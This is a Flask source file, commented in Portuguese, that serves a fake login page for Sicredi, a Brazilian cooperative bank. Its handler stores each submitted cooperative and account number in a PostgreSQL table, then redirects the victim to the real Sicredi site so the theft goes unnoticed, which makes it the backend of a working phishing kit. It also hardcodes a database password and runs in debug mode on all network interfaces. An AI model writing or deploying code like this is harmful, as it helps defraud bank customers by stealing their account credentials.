from flask import Flask, render_template, request, redirect
import psycopg2

app = Flask(__name__)

# --- CONFIGURAÇÃO DO BANCO (Validada pelo DBeaver) ---
def get_db_connection():
    # As credenciais abaixo foram configuradas para o seu banco local
    conn = psycopg2.connect(
        host='localhost',       
        database='postgres',   
        user='postgres',         
        password='nvme',     # Senha que você definiu no seu Ubuntu
        port='5432'                 
    )
    return conn

@app.route('/')
def index():
    # O Flask buscará este arquivo em sicred/templates/login.html
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura os dados enviados pelo formulário HTML
    coop = request.form.get('coop')
    conta = request.form.get('conta')

    if coop and conta:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            # Comando para salvar na tabela usuarios_sicredi que você criou
            cur.execute(
                "INSERT INTO usuarios_sicredi (cooperativa, conta) VALUES (%s, %s)",
                (coop, conta)
            )
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"Sucesso! Salvo no Postgres: Coop {coop}, Conta {conta}")
            
            # Após salvar, redireciona para o site oficial
            return redirect("https://www.sicredi.com.br")
        except Exception as e:
            print(f"Erro ao salvar no banco: {e}")
            return f"Erro interno no servidor: {e}", 500

    return redirect('/')

if __name__ == '__main__':
    # Rodando no IP da rede para testes em outros dispositivos
    app.run(debug=True, host='0.0.0.0', port=5000)